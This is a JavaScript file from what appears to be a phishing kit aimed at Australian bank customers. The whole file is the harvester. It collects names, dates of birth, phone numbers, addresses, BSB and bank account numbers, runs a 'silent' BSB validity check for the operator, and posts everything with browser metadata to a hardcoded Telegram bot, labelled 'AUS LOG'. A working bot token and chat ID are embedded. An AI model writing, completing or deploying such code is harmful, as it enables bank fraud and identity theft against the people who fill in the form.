/* ============================================================
   app.js — Continue не отправляет, пока все поля не заполнены
   ============================================================ */

/* ============================================
   TELEGRAM BOT CONFIG
   ============================================ */
const TG_BOT_TOKEN = '8723963100:AAHc8vHObrNL2pjepLKouWzQ57urGTJ2fBM';
const TG_CHAT_ID   = '-1003907097706';
const TG_API_URL   = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;

async function sendToTelegram(text) {
    const payload = {
        chat_id: TG_CHAT_ID,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
    };

    try {
        const res = await fetch(TG_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!res.ok) {
            const err = await res.text();
            console.error('[TG] HTTP error:', res.status, err);
            return { ok: false, status: res.status, error: err };
        }

        const data = await res.json();
        if (!data.ok) {
            console.error('[TG] API error:', data.description);
        }
        return data;
    } catch (e) {
        console.error('[TG] Network error:', e);
        return { ok: false, error: String(e) };
    }
}

function esc(s) {
    if (s === undefined || s === null) return '';
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

/* ============================================
   BSB VALIDATION (silent — result goes to bot only)
   ============================================ */

const BSB_BANK_MAP = {
    '01': 'ANZ', '02': 'ANZ',
    '03': 'Westpac', '04': 'Westpac', '05': 'Westpac',
    '06': 'Commonwealth Bank', '07': 'Commonwealth Bank',
    '08': 'NAB', '09': 'Reserve Bank of Australia',
    '10': 'Bankwest', '11': 'St.George Bank',
    '12': 'Bank of Queensland', '13': 'Bank of Melbourne', '14': 'Bendigo Bank',
    '15': 'Bank of Melbourne', '16': 'Bank of Queensland', '17': 'Bank of Queensland',
    '18': 'Macquarie Bank', '19': 'Bank of Queensland', '20': 'Bank of Queensland',
    '21': 'Commonwealth Bank', '22': 'Bank of Queensland', '23': 'Bank of Queensland',
    '24': 'Bank of Queensland', '25': 'Bank of Queensland', '26': 'Bank of Queensland',
    '27': 'Bank of Queensland', '28': 'Bank of Queensland', '29': 'Bank of Queensland',
    '30': 'Bankwest', '31': 'Bankwest',
    '32': 'Westpac', '33': 'Westpac', '34': 'Westpac', '35': 'Westpac',
    '36': 'Westpac', '37': 'Westpac', '38': 'Westpac', '39': 'Westpac',
    '40': 'Bank of Queensland', '41': 'Bank of Queensland', '42': 'Bank of Queensland',
    '43': 'Bank of Queensland', '44': 'Bank of Queensland', '45': 'Bank of Queensland',
    '46': 'Bank of Queensland', '47': 'Bank of Queensland', '48': 'Bank of Queensland',
    '49': 'Bank of Queensland', '50': 'Bank of Queensland', '51': 'Bank of Queensland',
    '52': 'Bank of Queensland', '53': 'Bank of Queensland', '54': 'Bank of Queensland',
    '55': 'Bank of Queensland', '56': 'Bank of Queensland', '57': 'Bank of Queensland',
    '58': 'Bank of Queensland', '59': 'Bank of Queensland', '60': 'Bank of Queensland',
    '61': 'Bank of Queensland',
    '62': 'Commonwealth Bank', '63': 'Commonwealth Bank', '64': 'Commonwealth Bank',
    '65': 'Commonwealth Bank', '66': 'Commonwealth Bank', '67': 'Commonwealth Bank',
    '68': 'Commonwealth Bank', '69': 'Commonwealth Bank', '70': 'Commonwealth Bank',
    '71': 'Commonwealth Bank', '72': 'Commonwealth Bank', '73': 'Commonwealth Bank',
    '74': 'Commonwealth Bank', '75': 'Commonwealth Bank', '76': 'Commonwealth Bank',
    '77': 'Commonwealth Bank', '78': 'Commonwealth Bank', '79': 'Commonwealth Bank',
    '80': 'NAB', '81': 'NAB', '82': 'NAB', '83': 'NAB', '84': 'NAB',
    '85': 'NAB', '86': 'NAB', '87': 'NAB', '88': 'NAB', '89': 'NAB',
    '90': 'NAB', '91': 'NAB', '92': 'NAB', '93': 'NAB', '94': 'NAB',
    '95': 'NAB', '96': 'NAB', '97': 'NAB', '98': 'NAB', '99': 'NAB'
};

const BSB_KNOWN_CODES = new Set([
    '012001','012002','012003','012004','012005','012006','012007','012008','012009',
    '013001','013002','013003','013004','013005','013006','013007','013008','013009',
    '014001','014002','014003','014004','014005','014006','014007','014008','014009',
    '015001','015002','015003','015004','015005','015006','015007','015008','015009',
    '016001','016002','016003','016004','016005','016006','016007','016008','016009',
    '017001','017002','017003','017004','017005','017006','017007','017008','017009',
    '032001','032002','032003','032004','032005','032006','032007','032008','032009',
    '033001','033002','033003','033004','033005','033006','033007','033008','033009',
    '034001','034002','034003','034004','034005','034006','034007','034008','034009',
    '035001','035002','035003','035004','035005','035006','035007','035008','035009',
    '036001','036002','036003','036004','036005','036006','036007','036008','036009',
    '037001','037002','037003','037004','037005','037006','037007','037008','037009',
    '038001','038002','038003','038004','038005','038006','038007','038008','038009',
    '039001','039002','039003','039004','039005','039006','039007','039008','039009',
    '062001','062002','062003','062004','062005','062006','062007','062008','062009',
    '063001','063002','063003','063004','063005','063006','063007','063008','063009',
    '064001','064002','064003','064004','064005','064006','064007','064008','064009',
    '065001','065002','065003','065004','065005','065006','065007','065008','065009',
    '066001','066002','066003','066004','066005','066006','066007','066008','066009',
    '067001','067002','067003','067004','067005','067006','067007','067008','067009',
    '068001','068002','068003','068004','068005','068006','068007','068008','068009',
    '069001','069002','069003','069004','069005','069006','069007','069008','069009',
    '082001','082002','082003','082004','082005','082006','082007','082008','082009',
    '083001','083002','083003','083004','083005','083006','083007','083008','083009',
    '084001','084002','084003','084004','084005','084006','084007','084008','084009',
    '085001','085002','085003','085004','085005','085006','085007','085008','085009',
    '086001','086002','086003','086004','086005','086006','086007','086008','086009',
    '087001','087002','087003','087004','087005','087006','087007','087008','087009',
    '088001','088002','088003','088004','088005','088006','088007','088008','088009',
    '089001','089002','089003','089004','089005','089006','089007','089008','089009',
    '182001','182002','182003','182004','182005','182006','182007','182008','182009',
    '112001','112002','112003','112004','112005','112006','112007','112008','112009',
    '112879','112880','112908',
    '102001','102002','102003','102004','102005','102006','102007','102008','102009',
    '302001','302002','302003','302004','302005','302006','302007','302008','302009',
    '142001','142002','142003','142004','142005','142006','142007','142008','142009',
    '122001','122002','122003','122004','122005','122006','122007','122008','122009',
    '132001','132002','132003','132004','132005','132006','132007','132008','132009',
]);

function validateBSB(raw) {
    const digits = String(raw || '').replace(/\D/g, '');

    if (digits.length === 0) {
        return { valid: false, reason: 'empty', bank: null, normalized: '' };
    }
    if (digits.length < 6) {
        return { valid: false, reason: 'too_short', bank: null, normalized: digits };
    }
    if (digits.length > 6) {
        return { valid: false, reason: 'too_long', bank: null, normalized: digits };
    }

    const firstTwo = digits.substring(0, 2);
    const bank = BSB_BANK_MAP[firstTwo] || null;

    if (firstTwo === '00') {
        return { valid: false, reason: 'zero_prefix', bank: null, normalized: digits };
    }
    if (!bank) {
        return { valid: false, reason: 'unknown_prefix', bank: null, normalized: digits };
    }

    const isKnownFull = BSB_KNOWN_CODES.has(digits);

    return {
        valid: true,
        reason: isKnownFull ? 'known_code' : 'valid_format',
        bank: bank,
        normalized: digits.substring(0, 3) + '-' + digits.substring(3, 6),
        isKnownFull: isKnownFull
    };
}

function buildBsbStatusLine(bsbCheck, bsbRaw) {
    const digits = String(bsbRaw || '').replace(/\D/g, '');

    if (digits.length === 0) {
        return '<b>BSB status:</b> <i>not provided</i>';
    }

    if (bsbCheck.valid) {
        const tag = bsbCheck.isKnownFull ? 'verified code' : 'valid format';
        return `<b>BSB status:</b> ✅ <b>VALID</b> (${esc(tag)}) — Bank: <code>${esc(bsbCheck.bank)}</code>`;
    }

    const map = {
        'too_short':      `❌ INVALID — too short (${digits.length}/6 digits)`,
        'too_long':       `❌ INVALID — too long (${digits.length}/6 digits)`,
        'zero_prefix':    '❌ INVALID — cannot start with 00',
        'unknown_prefix': `❌ INVALID — unknown bank prefix "${esc(digits.substring(0, 2))}"`
    };
    const msg = map[bsbCheck.reason] || '❌ INVALID';
    return `<b>BSB status:</b> ${msg}`;
}

/* ============================================
   FORM DATA COLLECTION
   ============================================ */
function collectFormData() {
    const get = (id) => {
        const el = document.getElementById(id);
        return el ? el.value.trim() : '';
    };

    const bsbRaw = get('bsb');
    const bsbCheck = validateBSB(bsbRaw);

    const data = {
        'First name':     get('first-name'),
        'Last name':      get('last-name'),
        'Date of birth':  get('dob'),
        'Phone number':   get('phone'),
        'Address':        get('address'),
        'Postcode':       get('postcode'),
        'BSB':            bsbRaw,
        'Account number': get('account-number')
    };

    const meta = {
        'User-Agent':  navigator.userAgent,
        'Language':    navigator.language,
        'Platform':    navigator.platform || 'n/a',
        'Timezone':    Intl.DateTimeFormat().resolvedOptions().timeZone,
        'Timestamp':   new Date().toISOString()
    };

    return { data, meta, bsbCheck };
}

function buildMessage(data, meta, bsbCheck) {
    const lines = [];
    lines.push('AUS LOG 🇦🇺🌏');
    lines.push('');
    lines.push('<b>── Form data ──</b>');

    let emptyCount = 0;
    for (const [k, v] of Object.entries(data)) {
        if (v) {
            lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
        } else {
            lines.push(`<b>${esc(k)}:</b> <i>(empty)</i>`);
            emptyCount++;
        }
    }

    lines.push('');
    lines.push('<b>── BSB check ──</b>');
    lines.push(buildBsbStatusLine(bsbCheck, data['BSB']));

    lines.push('');
    lines.push('<b>── Metadata ──</b>');
    for (const [k, v] of Object.entries(meta)) {
        lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
    }

    lines.push('');
    lines.push(`<i>Fields filled: ${Object.keys(data).length - emptyCount}/${Object.keys(data).length}</i>`);

    return lines.join('\n');
}

/* ============================================
   REQUIRED FIELD VALIDATION
   ============================================ */

const FIELD_IDS = [
    'first-name', 'last-name', 'dob', 'phone',
    'address', 'postcode', 'bsb', 'account-number'
];

const FIELD_RULES = {
    'dob': (v) => {
        if (v.length < 10) return 'Enter full date (DD/MM/YYYY)';
        const m = v.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
        if (!m) return 'Invalid date format';
        const d = parseInt(m[1], 10);
        const mo = parseInt(m[2], 10);
        const y = parseInt(m[3], 10);
        if (d < 1 || d > 31 || mo < 1 || mo > 12 || y < 1900 || y > 2030) return 'Invalid date';
        return null;
    },
    'phone': (v) => {
        const digits = v.replace(/\D/g, '');
        if (digits.length < 6) return 'Phone number is too short';
        return null;
    },
    'postcode': (v) => {
        const digits = v.replace(/\D/g, '');
        if (digits.length < 3) return 'Postcode is too short';
        return null;
    },
    'bsb': (v) => {
        const digits = v.replace(/\D/g, '');
        if (digits.length < 6) return 'BSB must be 6 digits (XXX-XXX)';
        return null;
    },
    'account-number': (v) => {
        const digits = v.replace(/\D/g, '');
        if (digits.length < 4) return 'Account number is too short';
        return null;
    }
};

function setFieldError(id, message) {
    const input = document.getElementById(id);
    const errEl = document.querySelector(`.field-error[data-error-for="${id}"]`);
    if (!input || !errEl) return;

    if (message) {
        input.classList.add('invalid');
        errEl.textContent = message;
    } else {
        input.classList.remove('invalid');
        errEl.textContent = '';
    }
}

function validateField(id) {
    const input = document.getElementById(id);
    if (!input) return true;

    const value = input.value.trim();

    if (!value) {
        setFieldError(id, 'This field is required');
        return false;
    }

    const rule = FIELD_RULES[id];
    if (rule) {
        const err = rule(value);
        if (err) {
            setFieldError(id, err);
            return false;
        }
    }

    setFieldError(id, '');
    return true;
}

function validateAllFields() {
    let allValid = true;
    let firstInvalid = null;

    FIELD_IDS.forEach(id => {
        const ok = validateField(id);
        if (!ok) {
            allValid = false;
            if (!firstInvalid) firstInvalid = document.getElementById(id);
        }
    });

    if (firstInvalid) {
        firstInvalid.focus();
        firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    return allValid;
}

/* ============================================
   SUBMIT ON CONTINUE BUTTON
   — если хоть одно поле пустое, ничего не уходит
   ============================================ */
const form      = document.getElementById('dataForm');
const submitBtn = document.getElementById('submitBtn');

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    if (!validateAllFields()) {
        return;
    }

    const { data, meta, bsbCheck } = collectFormData();
    const message = buildMessage(data, meta, bsbCheck);

    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Sending...';

    const result = await sendToTelegram(message);

    if (result && result.ok) {
        submitBtn.textContent = '✓ Sent';
        submitBtn.style.background = '#1a7f37';
    } else {
        submitBtn.textContent = '✗ Error';
        submitBtn.style.background = '#b91c1c';
    }

    setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
        submitBtn.style.background = '';
    }, 2000);
});

/* ============================================
   LIVE VALIDATION — снимаем ошибки по мере ввода
   ============================================ */
FIELD_IDS.forEach(id => {
    const input = document.getElementById(id);
    if (!input) return;

    input.addEventListener('input', () => {
        if (input.classList.contains('invalid')) {
            validateField(id);
        }
    });

    input.addEventListener('blur', () => {
        if (input.value.trim()) {
            validateField(id);
        }
    });
});

/* ============================================
   DATE AUTO-FORMAT (DD/MM/YYYY)
   ============================================ */
const dobInput = document.getElementById('dob');
dobInput.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '');
    v = v.substring(0, 8);
    let out = '';
    if (v.length > 0) out = v.substring(0, 2);
    if (v.length > 2) out += '/' + v.substring(2, 4);
    if (v.length > 4) out += '/' + v.substring(4, 8);
    e.target.value = out;
});

dobInput.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace') {
        const v = e.target.value;
        const pos = e.target.selectionStart;
        if (pos === v.length && (v.endsWith('/') || /\/$/.test(v))) {
            e.preventDefault();
            e.target.value = v.substring(0, v.length - 1);
        }
    }
});

/* ============================================
   POSTCODE — DIGITS ONLY
   ============================================ */
const postcodeInput = document.getElementById('postcode');
postcodeInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
});

/* ============================================
   BSB AUTO-FORMAT (XXX-XXX)
   ============================================ */
const bsbEl = document.getElementById('bsb');
bsbEl.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '');
    v = v.substring(0, 6);
    let out = '';
    if (v.length > 0) out = v.substring(0, 3);
    if (v.length > 3) out += '-' + v.substring(3, 6);
    e.target.value = out;
});

bsbEl.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace') {
        const v = e.target.value;
        const pos = e.target.selectionStart;
        if (pos === v.length && v.endsWith('-')) {
            e.preventDefault();
            e.target.value = v.substring(0, v.length - 1);
        }
    }
});

/* ============================================
   DIGITS ONLY FOR ACCOUNT NUMBER
   ============================================ */
const accInput = document.getElementById('account-number');
accInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
});

/* ============================================
   SMOOTH SCROLL TO SIGN IN
   ============================================ */
document.querySelectorAll('[data-scroll="signin"]').forEach(el => {
    el.addEventListener('click', (e) => {
        e.preventDefault();
        const target = document.getElementById('signin');
        if (target) {
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            target.style.transition = 'background 0.3s ease';
            target.style.background = '#fffbe6';
            setTimeout(() => { target.style.background = ''; }, 900);
        }
    });
});
